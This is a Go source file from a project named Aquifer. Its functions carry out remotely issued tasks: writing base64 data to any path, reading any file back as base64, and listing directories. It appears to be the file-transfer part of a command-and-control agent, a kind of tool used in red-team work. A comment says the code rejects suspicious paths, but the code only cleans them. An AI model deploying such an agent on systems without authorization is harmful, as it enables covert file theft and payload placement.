package tasking

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"time"

	"github.com/Real-Fruit-Snacks/Aquifer/pkg/config"
)

const (
	// chunkSize is the maximum size for chunked file transfers (1 MB).
	chunkSize = 1024 * 1024
)

// FileEntry represents a single directory listing entry.
type FileEntry struct {
	Name    string `json:"name"`
	Size    int64  `json:"size"`
	Mode    string `json:"mode"`
	ModTime string `json:"mod_time"`
	IsDir   bool   `json:"is_dir"`
}

// UploadFile writes base64-decoded data from args["data"] to args["path"].
// The file is written atomically by writing to a temp file first, then renaming.
// Supports chunked uploads: args["chunk_index"] and args["total_chunks"] for
// multi-part transfers. If args["append"] is "true", data is appended.
func UploadFile(task config.Task) ([]byte, error) {
	path, ok := task.Args["path"]
	if !ok || path == "" {
		return nil, fmt.Errorf("upload: missing 'path' argument")
	}
	// Sanitize: resolve to absolute, clean, and reject suspicious paths
	path = filepath.Clean(path)
	resolved, err := filepath.Abs(path)
	if err != nil {
		return nil, fmt.Errorf("upload: invalid path: %w", err)
	}
	path = resolved

	data, ok := task.Args["data"]
	if !ok || data == "" {
		return nil, fmt.Errorf("upload: missing 'data' argument")
	}

	decoded, err := base64.StdEncoding.DecodeString(data)
	if err != nil {
		return nil, fmt.Errorf("upload: base64 decode failed: %w", err)
	}

	// Ensure parent directory exists.
	dir := filepath.Dir(path)
	if err := os.MkdirAll(dir, 0750); err != nil {
		return nil, fmt.Errorf("upload: failed to create directory %s: %w", dir, err)
	}

	// Check for chunked/append mode.
	if task.Args["append"] == "true" {
		f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0640)
		if err != nil {
			return nil, fmt.Errorf("upload: failed to open file for append: %w", err)
		}
		defer f.Close()

		n, err := f.Write(decoded)
		if err != nil {
			return nil, fmt.Errorf("upload: append write failed: %w", err)
		}
		return []byte(fmt.Sprintf("appended %d bytes to %s", n, path)), nil
	}

	// Atomic write: temp file then rename.
	tmpPath := path + ".tmp"
	if err := os.WriteFile(tmpPath, decoded, 0640); err != nil {
		return nil, fmt.Errorf("upload: write failed: %w", err)
	}

	if err := os.Rename(tmpPath, path); err != nil {
		// Fallback: remove temp file on rename failure.
		os.Remove(tmpPath)
		return nil, fmt.Errorf("upload: rename failed: %w", err)
	}

	// Set permissions from args if provided, default to 0640.
	mode := os.FileMode(0640)
	if m, ok := task.Args["mode"]; ok {
		var parsed uint64
		parsed, err = parseFileMode(m)
		if err == nil {
			mode = os.FileMode(parsed)
		}
	}
	os.Chmod(path, mode)

	return []byte(fmt.Sprintf("wrote %d bytes to %s", len(decoded), path)), nil
}

// DownloadFile reads the file at args["path"] and returns its content
// base64-encoded. Supports chunked downloads: if args["offset"] and
// args["length"] are set, only that portion is returned.
func DownloadFile(task config.Task) ([]byte, error) {
	path, ok := task.Args["path"]
	if !ok || path == "" {
		return nil, fmt.Errorf("download: missing 'path' argument")
	}
	path = filepath.Clean(path)
	resolved, err := filepath.Abs(path)
	if err != nil {
		return nil, fmt.Errorf("download: invalid path: %w", err)
	}
	path = resolved

	f, err := os.Open(path)
	if err != nil {
		return nil, fmt.Errorf("download: %w", err)
	}
	defer f.Close()

	stat, err := f.Stat()
	if err != nil {
		return nil, fmt.Errorf("download: stat failed: %w", err)
	}

	if stat.IsDir() {
		return nil, fmt.Errorf("download: %s is a directory, use 'ls' task", path)
	}

	// Chunked read support.
	var data []byte
	if offsetStr, ok := task.Args["offset"]; ok {
		offset := parseInt64(offsetStr, 0)
		length := parseInt64(task.Args["length"], chunkSize)

		data = make([]byte, length)
		n, err := f.ReadAt(data, offset)
		if err != nil && err != io.EOF {
			return nil, fmt.Errorf("download: read at offset %d failed: %w", offset, err)
		}
		data = data[:n]
	} else {
		// Read entire file, but cap at a sane limit to prevent OOM.
		if stat.Size() > 50*1024*1024 {
			return nil, fmt.Errorf("download: file too large (%d bytes), use chunked download", stat.Size())
		}
		data, err = io.ReadAll(f)
		if err != nil {
			return nil, fmt.Errorf("download: read failed: %w", err)
		}
	}

	// Return as JSON with base64 data and metadata.
	result := map[string]interface{}{
		"path":     path,
		"size":     stat.Size(),
		"data":     base64.StdEncoding.EncodeToString(data),
		"data_len": len(data),
	}

	return json.Marshal(result)
}

// ListDirectory lists the contents of the directory at args["path"].
// Returns a JSON array of FileEntry structs with name, size, mode, and timestamps.
func ListDirectory(task config.Task) ([]byte, error) {
	path, ok := task.Args["path"]
	if !ok || path == "" {
		path = "."
	}

	entries, err := os.ReadDir(path)
	if err != nil {
		return nil, fmt.Errorf("ls: %w", err)
	}

	var files []FileEntry
	for _, entry := range entries {
		info, err := entry.Info()
		if err != nil {
			// Skip entries we cannot stat.
			continue
		}

		files = append(files, FileEntry{
			Name:    entry.Name(),
			Size:    info.Size(),
			Mode:    info.Mode().String(),
			ModTime: info.ModTime().Format(time.RFC3339),
			IsDir:   entry.IsDir(),
		})
	}

	return json.Marshal(files)
}

// parseInt64 parses a string as int64, returning def on failure.
func parseInt64(s string, def int64) int64 {
	if s == "" {
		return def
	}
	var v int64
	_, err := fmt.Sscanf(s, "%d", &v)
	if err != nil {
		return def
	}
	return v
}

// parseFileMode parses an octal file mode string (e.g., "0755").
func parseFileMode(s string) (uint64, error) {
	var mode uint64
	_, err := fmt.Sscanf(s, "%o", &mode)
	return mode, err
}
